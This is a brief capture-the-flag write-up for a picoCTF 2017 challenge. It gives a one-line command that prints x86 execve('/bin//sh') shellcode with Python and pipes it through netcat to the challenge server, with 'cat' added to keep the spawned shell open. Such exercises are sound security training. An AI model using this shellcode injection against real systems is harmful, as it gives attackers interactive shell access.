First get a shellcode from shell-storm.org/shellcode and python print it out. 
But the shell will exit because we didn't give any instruction.
So add parenthesis and semicolumn with "cat" to keep the shell open
Then we can get the shell  

(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; cat;) | nc shell2017.picoctf.com 23459
